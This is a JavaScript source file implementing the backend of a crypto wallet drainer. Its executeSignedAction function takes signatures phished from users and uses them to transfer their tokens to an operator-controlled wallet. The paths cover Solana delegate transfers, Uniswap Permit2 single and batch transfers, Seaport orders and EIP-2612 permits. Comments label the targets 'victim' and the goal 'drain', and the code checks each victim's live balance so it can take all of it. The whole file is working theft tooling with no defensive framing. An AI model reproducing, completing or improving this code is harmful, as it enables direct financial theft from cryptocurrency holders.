const { ethers } = require('ethers');
const { Connection, Transaction, PublicKey, Keypair, ComputeBudgetProgram } = require('@solana/web3.js');
const { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } = require('@solana/spl-token');

// --- 🔧 FIX: Robust bs58 import for all versions ---
const bs58_module = require('bs58');
const bs58 = {
    decode: bs58_module.decode || (bs58_module.default ? bs58_module.default.decode : null)
};

// Validate bs58 loaded correctly
if (!bs58.decode) {
    console.error("❌ CRITICAL: bs58 library failed to load. Install with: npm install bs58");
}

// --- CONFIGURATION ---
const RPC_URLS = {
  1: process.env.REACT_APP_ETH_RPC || 'https://rpc.ankr.com/eth',
  56: process.env.BSC_RPC || 'https://bsc-dataseed.binance.org',
  137: process.env.POLYGON_RPC || 'https://polygon-rpc.com',
  42161: process.env.ARBITRUM_RPC || 'https://arb1.arbitrum.io/rpc',
  10: process.env.OPTIMISM_RPC || 'https://mainnet.optimism.io',
  
  // Mapping for string keys
  ethereum: process.env.REACT_APP_ETH_RPC || 'https://rpc.ankr.com/eth',
  bnb: process.env.BSC_RPC || 'https://bsc-dataseed.binance.org',
  polygon: process.env.POLYGON_RPC || 'https://polygon-rpc.com',
  arbitrum: process.env.ARBITRUM_RPC || 'https://arb1.arbitrum.io/rpc',
  optimism: process.env.OPTIMISM_RPC || 'https://mainnet.optimism.io',
  solana: process.env.REACT_APP_SOLANA_RPC || 'https://solana-rpc.publicnode.com',  
};

// --- SECURITY CHECKS ---
if (!process.env.EVM_PRIVATE_KEY) console.warn("⚠️ EVM_PRIVATE_KEY missing in .env");
if (!process.env.SOLANA_PRIVATE_KEY) console.warn("⚠️ SOLANA_PRIVATE_KEY missing in .env");

const EVM_PRIVATE_KEY = process.env.EVM_PRIVATE_KEY; 
const SOLANA_PRIVATE_KEY_STRING = process.env.SOLANA_PRIVATE_KEY; 

// Permit2 Contract Address (same on all EVM chains)
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const PERMIT2_ABI = [
  'function permitTransferFrom(((address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature) external',
  'function permitBatchTransferFrom(((address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external'
];

const SEAPORT_ADDRESS = '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC';
const SEAPORT_ABI = [
  'function fulfillBasicOrder((address considerationToken, uint256 considerationIdentifier, uint256 considerationAmount, address offerer, address zone, address offerToken, uint256 offerIdentifier, uint256 offerAmount, uint8 basicOrderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 offererConduitKey, bytes32 fulfillerConduitKey, uint256 totalOriginalAdditionalRecipients, (uint256 amount, address recipient)[] additionalRecipients, bytes signature) parameters) payable returns (bool)'
];
const ERC20_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) public returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)'
];

// --- HELPER: Get Solana Admin Keypair ---
function getSolanaAdmin() {
    if (!SOLANA_PRIVATE_KEY_STRING) throw new Error("CRITICAL: SOLANA_PRIVATE_KEY missing");
    
    try {
        if (SOLANA_PRIVATE_KEY_STRING.includes('[')) {
            return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(SOLANA_PRIVATE_KEY_STRING)));
        }
        if (!bs58.decode) throw new Error("bs58 library not loaded correctly");
        return Keypair.fromSecretKey(bs58.decode(SOLANA_PRIVATE_KEY_STRING));
    } catch (e) {
        throw new Error(`Failed to load Solana Keypair: ${e.message}`);
    }
}

// --- HELPER: Sleep for rate limiting ---
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function executeSignedAction({ submissionData }) {
  const { asset, signature, message, chainId, payload } = submissionData;
  const { type, address: assetAddress, symbol } = asset;
  const payloadMessage = message || submissionData.payload?.message || {};
  const payloadType = payload?.type;

  console.log('\n═══════════════════════════════════════════');
  console.log(`🤖 EXECUTOR START: ${type} | Chain: ${chainId} | Asset: ${symbol}`);
  console.log(`📋 Payload Type: ${payloadType}`);
  console.log('═══════════════════════════════════════════');

  try {
    // ============================================
    // CASE 1: SOLANA (Drain via Delegate)
    // ============================================
    if (chainId === 'solana') {
        const { type: payloadType } = payload; 
        console.log(`ℹ️ Action Type: ${payloadType}`);

        if (payloadType === 'SOL_APPROVE') {
            const connection = new Connection(RPC_URLS.solana, "confirmed");
            const adminWallet = getSolanaAdmin();
            const victimPubkey = new PublicKey(submissionData.user);
            const mintPubkey = new PublicKey(assetAddress);

            // ⛽ GAS CHECK (Robust)
            const adminSolBalance = await connection.getBalance(adminWallet.publicKey);
            const MIN_SOL_BALANCE = 10000000; // 0.01 SOL
            if (adminSolBalance < MIN_SOL_BALANCE) {
                 throw new Error(`❌ Admin Wallet Low Gas! Has ${(adminSolBalance/1e9).toFixed(5)} SOL. Need > 0.01 SOL.`);
            }

            // 🔍 VALIDATION: Verify Victim Account Exists
            const sourceAccount = await getAssociatedTokenAddress(mintPubkey, victimPubkey, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);
            const destinationAccount = await getAssociatedTokenAddress(mintPubkey, adminWallet.publicKey, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);

            // 🔍 REAL-TIME BALANCE CHECK (Prevent Simulation Failures)
            let realBalance = BigInt(0);
            try {
                const balanceInfo = await connection.getTokenAccountBalance(sourceAccount);
                realBalance = BigInt(balanceInfo.value.amount);
                console.log(`   Real-time Balance: ${balanceInfo.value.uiAmountString} ${symbol}`);
            } catch (e) {
                if (e.message.includes("could not find account")) {
                    throw new Error("❌ Victim token account empty/closed.");
                }
                throw e; // Network error
            }

            if (realBalance <= BigInt(0)) throw new Error("❌ Balance is 0. Aborting.");

            // 🛠 BUILD TRANSACTION
            const tx = new Transaction();
            
            // Priority Fee (Optional but recommended for reliability)
            tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));

            // Check if Admin Token Account needs creation
            const destInfo = await connection.getAccountInfo(destinationAccount);
            if (!destInfo) {
                console.log("   Creating Admin ATA...");
                tx.add(
                    createAssociatedTokenAccountInstruction(
                        adminWallet.publicKey, // Payer
                        destinationAccount,    // New Account
                        adminWallet.publicKey, // Owner
                        mintPubkey             // Mint
                    )
                );
            }

            // Add Transfer
            tx.add(
                createTransferInstruction(
                    sourceAccount,          // From (Victim)
                    destinationAccount,     // To (Admin)
                    adminWallet.publicKey,  // Signer (Delegate)
                    realBalance,            
                    [],
                    TOKEN_PROGRAM_ID
                )
            );

            // 🚀 SEND (with Retries)
            const signature = await connection.sendTransaction(tx, [adminWallet], {
                skipPreflight: false,
                preflightCommitment: 'confirmed',
                maxRetries: 3
            });
            
            console.log(`✅ Solana Success: https://solscan.io/tx/${signature}`);
            return true;
        } 
        else if (payloadType === 'SOL_TRANSFER' || payloadType === 'SOL_TX') {
            console.log(`ℹ️ Native Transfer already signed. Hash: ${signature}`);
            return true;
        }
    }

    // ============================================
    // EVM SETUP & GAS MANAGEMENT
    // ============================================
    const rpcUrl = RPC_URLS[chainId];
    if (!rpcUrl) throw new Error(`Unsupported Chain ID: ${chainId}`);
    
    // Validate EVM private key before using
    if (!EVM_PRIVATE_KEY) {
      throw new Error("CRITICAL: EVM_PRIVATE_KEY not configured in .env");
    }
    
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const executorWallet = new ethers.Wallet(EVM_PRIVATE_KEY, provider);

    // ⛽ EVM GAS OPTIMIZATION
    const feeData = await provider.getFeeData();
    const gasConfig = {
        maxFeePerGas: feeData.maxFeePerGas ? (feeData.maxFeePerGas * 120n) / 100n : undefined, // +20%
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? (feeData.maxPriorityFeePerGas * 120n) / 100n : undefined
    };

    // ============================================
    // CASE 2: PERMIT2 TRANSFER (Uniswap Universal Approval)
    // ============================================
    if (payloadType === 'PERMIT2_TRANSFER' || payloadType === 'PERMIT2_BATCH') {
       console.log(`🔐 Executing Permit2 Transfer (${payloadType})...`);
       const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, executorWallet);
       
       // For PERMIT2_BATCH, use targetToken to identify which token to drain
       const targetTokenAddress = payload.targetToken || payload.message?.permitted?.token || assetAddress;
       const tokenContract = new ethers.Contract(targetTokenAddress, ERC20_ABI, provider);
       
       // Get the permit details from payload
       const permitMessage = payload.message;
       
       // Handle both single (permitted object) and batch (permitted array) formats
       let permitted;
       if (Array.isArray(permitMessage.permitted)) {
           // BATCH format: find the specific token we're draining
           permitted = permitMessage.permitted.find(p => 
               p.token.toLowerCase() === targetTokenAddress.toLowerCase()
           ) || permitMessage.permitted[0];
           console.log(`   Batch mode: found token ${permitted.token}`);
       } else {
           // Single format
           permitted = permitMessage.permitted;
       }
       
       // Get real-time balance to transfer
       let transferAmount;
       try {
           const realBalance = await tokenContract.balanceOf(submissionData.user);
           const permitAmount = BigInt(permitted.amount);
           transferAmount = realBalance < permitAmount ? realBalance : permitAmount;
           console.log(`   Real Balance: ${ethers.formatUnits(realBalance, asset.decimals || 18)} ${symbol}`);
           console.log(`   Transfer Amount: ${ethers.formatUnits(transferAmount, asset.decimals || 18)} ${symbol}`);
       } catch (e) {
           transferAmount = BigInt(permitted.amount);
           console.warn(`   ⚠️ Could not fetch balance, using permit amount`);
       }
       
       if (transferAmount <= 0n) {
           throw new Error("❌ Balance is 0. Aborting.");
       }
       
       // Build Permit2 parameters (always use single format for transfer)
       const permit = {
           permitted: {
               token: permitted.token,
               amount: permitted.amount
           },
           nonce: permitMessage.nonce,
           deadline: permitMessage.deadline
       };
       
       const transferDetails = {
           to: executorWallet.address,
           requestedAmount: transferAmount.toString()
       };
       
       try {
           // Estimate gas first
           const estimatedGas = await permit2Contract.permitTransferFrom.estimateGas(
               permit,
               transferDetails,
               submissionData.user,
               signature
           );
           
           const tx = await permit2Contract.permitTransferFrom(
               permit,
               transferDetails,
               submissionData.user,
               signature,
               { ...gasConfig, gasLimit: (estimatedGas * 150n) / 100n } // +50% buffer for safety
           );
           
           console.log(`✅ Permit2 TX Sent: ${tx.hash}`);
           await tx.wait(1);
           console.log(`✅ Permit2 Transfer Confirmed!`);
           return true;
       } catch (err) {
           console.error("❌ Permit2 Error Details:", err);
           throw new Error(`Permit2 Fail: ${err.reason || err.shortMessage || err.message}`);
       }
    }

    // ============================================
    // CASE 3: SEAPORT (Legacy - for backwards compatibility)
    // ============================================
    if (['ERC20', 'BEP20', 'ERC721'].includes(type) && payloadMessage.offer) {
       console.log(`🌊 Executing Seaport...`);
       const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, executorWallet);
       
       const params = {
         considerationToken: assetAddress,
         considerationIdentifier: 0,
         considerationAmount: asset.balance,
         offerer: submissionData.user,
         zone: '0x0000000000000000000000000000000000000000',
         offerToken: assetAddress,
         offerIdentifier: 0,
         offerAmount: asset.balance,
         basicOrderType: 16,
         startTime: payloadMessage.startTime,
         endTime: payloadMessage.endTime,
         zoneHash: payloadMessage.zoneHash,
         salt: payloadMessage.salt,
         offererConduitKey: payloadMessage.conduitKey,
         fulfillerConduitKey: '0x0000000000000000000000000000000000000000000000000000000000000000',
         totalOriginalAdditionalRecipients: 0,
         additionalRecipients: [],
         signature: signature
       };

       try {
           // Estimate Gas First
           const estimatedGas = await seaport.fulfillBasicOrder.estimateGas(params);
           const tx = await seaport.fulfillBasicOrder(params, { 
               ...gasConfig, 
               gasLimit: (estimatedGas * 120n) / 100n // +20% Buffer
           });
           console.log(`✅ Seaport TX Sent: ${tx.hash}`);
           await tx.wait(1);
           return true;
       } catch (err) {
           throw new Error(`Seaport Fail: ${err.reason || err.message}`);
       }
    }

    // ============================================
    // CASE 4: ERC20 PERMIT (Legacy EIP-2612)
    // ============================================
    if (type === 'ERC20_PERMIT') {
       console.log(`📝 Executing ERC20 Permit...`);
       const tokenContract = new ethers.Contract(assetAddress, ERC20_ABI, executorWallet);
       const sig = ethers.Signature.from(signature);

       // 🔍 NONCE CHECK (Race Condition Handling)
       const nonce = await executorWallet.getNonce();

       // 1. Submit Permit
       const allowance = await tokenContract.allowance(submissionData.user, executorWallet.address);
       if (allowance < BigInt(payloadMessage.value)) {
           console.log("   -> Submitting Permit...");
           try {
               // Estimate gas specifically for permit
               const gasEst = await tokenContract.permit.estimateGas(
                   submissionData.user, executorWallet.address, payloadMessage.value, payloadMessage.deadline, sig.v, sig.r, sig.s
               );
               const permitTx = await tokenContract.permit(
                   submissionData.user, executorWallet.address, payloadMessage.value, payloadMessage.deadline, sig.v, sig.r, sig.s,
                   { ...gasConfig, gasLimit: (gasEst * 120n) / 100n, nonce: nonce }
               );
               await permitTx.wait(1);
           } catch (e) {
               console.warn("   ⚠️ Permit failed (likely already executed or expired):", e.shortMessage || e.message);
               // Continue to transfer attempt anyway, just in case allowance exists
           }
       }

       // 2. Transfer Funds
       console.log("   -> Transferring funds...");
       const freshNonce = await executorWallet.getNonce(); // Get fresh nonce
       const transferGas = await tokenContract.transferFrom.estimateGas(submissionData.user, executorWallet.address, asset.balance);
       
       const transferTx = await tokenContract.transferFrom(
           submissionData.user, 
           executorWallet.address, 
           asset.balance,
           { ...gasConfig, gasLimit: (transferGas * 120n) / 100n, nonce: freshNonce }
       );
       console.log(`✅ Permit Transfer Success: ${transferTx.hash}`);
       return true;
    }

    if (type === 'NATIVE' || type === 'NATIVE_TX') {
        return true;
    }

    // Unhandled asset type - log and return false
    console.warn(`⚠️ Unhandled asset type: ${type} on chain ${chainId}`);
    return false;

  } catch (error) {
    console.error("❌ CRITICAL EXECUTION ERROR:", error.message);
    if(error.transaction) console.error("   Tx Data:", error.transaction);
    return false;
  }
}

module.exports = { executeSignedAction };